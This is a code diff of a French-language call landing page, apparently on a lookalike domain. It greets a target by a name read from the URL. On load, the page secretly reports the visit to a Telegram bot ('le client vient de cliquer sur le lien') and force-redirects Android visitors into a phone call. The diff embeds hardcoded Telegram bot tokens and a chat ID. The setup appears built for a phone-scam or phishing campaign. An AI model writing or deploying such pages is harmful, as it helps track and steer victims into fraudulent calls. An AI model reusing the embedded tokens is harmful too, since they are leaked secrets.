@@ -72,7 +72,7 @@
 <body>
 
   <div class="card">
-    <div id="txt-greeting" class="greeting">Bonjour David</div>
+    <div id="txt-greeting" class="greeting">Bonjour</div>
     <div class="subtext">Appuyez ci-dessous pour lancer l'appel</div>
 
     <a id="btn-call" class="btn-call" href="tel:+33600000000">
@@ -84,43 +84,39 @@
   </div>
 
   <script>
-    // ⚠️ Ton numéro de téléphone
+    // ⚠️ Remplace par ton vrai numéro si besoin
     var MON_NUMERO = "+33600000000"; 
     var NUMERO = "tel:" + MON_NUMERO;
 
-    // Configuration Telegram Bot
-    var TELEGRAM_TOKEN = "8951219121:AAGF6rzN7u13c13P2YxD-aOpOdf3iwdXtMA";
-    var TELEGRAM_CHAT_ID = "-1004410634781";
+    // VRAIS IDENTIFIANTS TELEGRAM (issus de ton ancien projet)
+    var botToken = "8326192481:AAFeag-sd84P6ykvzDyh0ZK3jNqHLtM2KSQ";
+    var chatId = "-1004410634781";
 
-    // Récupération du prénom dans l'URL (ex: allordv.lol/Momo)
-    var path = window.location.pathname.replace(/^\/+|\/+$/g, '');
-    var nomClient = path ? decodeURIComponent(path) : "Client";
-
-    // Mise à jour de la page
-    document.getElementById("txt-greeting").innerText = "Bonjour " + nomClient;
-    document.getElementById("btn-call").href = NUMERO;
-
-    // Envoi garanti de l'alerte Telegram
-    function sendTelegramAlert(clientName) {
-      var textAlert = "🚨 CLIC DÉTECTÉ Projet numéro redirection !\nLe client " + clientName + " vient de cliquer sur le lien ! 🔥";
-      var url = "https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage";
-
-      var formData = new FormData();
-      formData.append("chat_id", TELEGRAM_CHAT_ID);
-      formData.append("text", textAlert);
-
-      // Envoi garanti en arrière-plan (survit aux redirections sous Android)
-      if (navigator.sendBeacon) {
-        navigator.sendBeacon(url, formData);
-      } else {
-        fetch(url + "?chat_id=" + TELEGRAM_CHAT_ID + "&text=" + encodeURIComponent(textAlert), { keepalive: true }).catch(function(){});
-      }
+    // Récupération du prénom dans l'URL (ex: allordv.lol/Ryan)
+    let decodedName = 'Client';
+    const pathSegments = window.location.pathname.split('/').filter(Boolean);
+    if (pathSegments.length > 0) {
+      const rawPathName = pathSegments[0].replace(/-/g, ' ');
+      decodedName = decodeURIComponent(rawPathName).trim();
+    } else {
+      const params = new URLSearchParams(window.location.search);
+      const clientName = params.get('nom') || params.get('prenom') || 'Client';
+      decodedName = decodeURIComponent(clientName).trim();
     }
 
-    // Déclencher l'alerte dès que la page est chargée
-    sendTelegramAlert(nomClient);
+    if (!decodedName || decodedName.length < 2) {
+      decodedName = 'Client';
+    }
 
-    // Redirection automatique pour Android uniquement
+    // Mise à jour du texte de la page
+    document.getElementById('txt-greeting').textContent = "Bonjour " + decodedName;
+    document.getElementById('btn-call').href = NUMERO;
+
+    // Envoi Telegram exactement comme ton ancien projet
+    const telegramMsg = "🚨 CLIC DÉTECTÉ Projet numéro redirection !\nLe client " + decodedName + " vient de cliquer sur le lien ! 🔥";
+    fetch("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(telegramMsg)).catch(function(e) {});
+
+    // Redirection automatique Android
     var isAndroid = /android/i.test(navigator.userAgent);
     if (isAndroid) {
       window.location.href = NUMERO;
